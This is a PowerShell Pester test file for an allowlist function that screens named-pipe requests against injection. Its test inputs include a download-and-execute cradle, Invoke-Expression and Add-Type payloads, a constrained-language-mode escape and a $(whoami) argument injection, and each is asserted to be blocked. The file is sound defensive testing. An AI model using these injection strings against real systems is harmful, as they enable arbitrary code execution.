#Requires -Modules @{ ModuleName = 'Pester'; ModuleVersion = '5.0' }
<#
	Unit tests for the 0.10 pipe-injection request allowlist (Test-RequestPolicy).
	Self-contained: dot-sources the function file directly. No module import, no pipe, no elevation,
	no UAC. This is the Step-1 proving ground for PIPE-INJECTION-HARDENING-PLAN.md Item 1.
#>

BeforeAll {
	$Script:FnPath = Join-Path (Split-Path $PSScriptRoot -Parent) 'Functions\Test-RequestPolicy.ps1'
	. $Script:FnPath

	# Illustrative allowlist. The real one is supplied per-consumer at session start.
	$Script:Policy = @{ AllowedCommands = @('Invoke-VHDAction', 'Get-Service', 'Select-Object', 'Where-Object', 'ForEach-Object') }
}

Describe 'Test-RequestPolicy - allowed shapes' {

	It 'allows the dispatch shape VHDTools actually sends' {
		$r = Test-RequestPolicy -Request "Invoke-VHDAction -MountDisk 'True' -VHDLocation 'W:\x.vhdx'" -Policy $Script:Policy
		$r.Allowed | Should -BeTrue -Because $r.Reason
	}

	It 'allows a pipeline of allowlisted commands with literal args' {
		$r = Test-RequestPolicy -Request "Get-Service | Select-Object Name, Status" -Policy $Script:Policy
		$r.Allowed | Should -BeTrue -Because $r.Reason
	}

	It 'allows a hashtable argument of literals' {
		$r = Test-RequestPolicy -Request "Invoke-VHDAction -Options @{ Depth = '4'; Wait = 'False' }" -Policy $Script:Policy
		$r.Allowed | Should -BeTrue -Because $r.Reason
	}

	It 'allows a bare variable as an argument value' {
		$r = Test-RequestPolicy -Request "Invoke-VHDAction -Flag `$true" -Policy $Script:Policy
		$r.Allowed | Should -BeTrue -Because $r.Reason
	}
}

Describe 'Test-RequestPolicy - the classic injection toolkit is blocked' {

	It 'blocks a command not on the allowlist' {
		(Test-RequestPolicy -Request "Stop-Service -Name Foo" -Policy $Script:Policy).Allowed | Should -BeFalse
	}

	It 'blocks Add-Type (C# compilation) + a type/member call' {
		(Test-RequestPolicy -Request "Add-Type -TypeDefinition `$c; [Evil]::Run()" -Policy $Script:Policy).Allowed | Should -BeFalse
	}

	It 'blocks the & call operator on a variable scriptblock' {
		(Test-RequestPolicy -Request "& `$sb" -Policy $Script:Policy).Allowed | Should -BeFalse
	}

	It 'blocks dot-sourcing' {
		(Test-RequestPolicy -Request ". `$profile" -Policy $Script:Policy).Allowed | Should -BeFalse
	}

	It 'blocks Invoke-Expression' {
		(Test-RequestPolicy -Request "Invoke-Expression `$payload" -Policy $Script:Policy).Allowed | Should -BeFalse
	}

	It 'blocks a direct .NET static method call' {
		(Test-RequestPolicy -Request "[System.IO.File]::WriteAllText('c:\x','y')" -Policy $Script:Policy).Allowed | Should -BeFalse
	}

	It 'blocks the download cradle' {
		(Test-RequestPolicy -Request "iex (New-Object Net.WebClient).DownloadString('http://x')" -Policy $Script:Policy).Allowed | Should -BeFalse
	}
}

Describe 'Test-RequestPolicy - default-deny catches what a blocklist misses' {

	It 'BLOCKS the language-mode flip (a plain assignment - the case a blocklist wrongly allowed)' {
		# This is the exact regression the AST probe exposed: not a command, method, or type, so a
		# blocklist passes it. Default-deny rejects it because AssignmentStatementAst is not allowed.
		$r = Test-RequestPolicy -Request "`$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'" -Policy $Script:Policy
		$r.Allowed | Should -BeFalse -Because 'AssignmentStatementAst must fail closed'
	}

	It 'blocks an in-request function definition (the flexible pattern is disallowed under policy)' {
		# Consumers may currently ship helper functions inside the scriptblock; under a policy that
		# flexibility (and its attack surface) is refused. Documents the migration cost.
		(Test-RequestPolicy -Request "function Foo { 'x' }; Foo" -Policy $Script:Policy).Allowed | Should -BeFalse
	}

	It 'blocks a computed (interpolated) string argument by default' {
		$r = Test-RequestPolicy -Request "Invoke-VHDAction -VHDLocation `"W:\`$(whoami).vhdx`"" -Policy $Script:Policy
		$r.Allowed | Should -BeFalse -Because 'embedded $() must be rejected in strict mode'
	}

	It 'blocks a computed argument via the format operator' {
		(Test-RequestPolicy -Request "Invoke-VHDAction -VHDLocation ('{0}' -f `$x)" -Policy $Script:Policy).Allowed | Should -BeFalse
	}

	It 'blocks command substitution used as an argument' {
		(Test-RequestPolicy -Request "Invoke-VHDAction -VHDLocation (Get-Secret)" -Policy $Script:Policy).Allowed | Should -BeFalse
	}
}

Describe 'Test-RequestPolicy - policy behaviour' {

	It 'denies every command when AllowedCommands is empty (default-deny)' {
		(Test-RequestPolicy -Request "Invoke-VHDAction -X 'y'" -Policy @{ AllowedCommands = @() }).Allowed | Should -BeFalse
	}

	It 'is case-insensitive on command names' {
		(Test-RequestPolicy -Request "invoke-vhdaction -X 'y'" -Policy $Script:Policy).Allowed | Should -BeTrue
	}

	It 'allows an interpolated string when AllowComputedArguments is set' {
		$p = @{ AllowedCommands = @('Invoke-VHDAction'); AllowComputedArguments = $true }
		(Test-RequestPolicy -Request "Invoke-VHDAction -Note `"hi `$name`"" -Policy $p).Allowed | Should -BeTrue
	}

	It 'reports a clear reason on rejection' {
		(Test-RequestPolicy -Request "Add-Type -X 'y'" -Policy $Script:Policy).Reason | Should -Match 'command not allowed'
	}

	It 'rejects a malformed request as a parse error, not a crash' {
		(Test-RequestPolicy -Request "Invoke-VHDAction -X '" -Policy $Script:Policy).Reason | Should -Match 'parse error'
	}
}
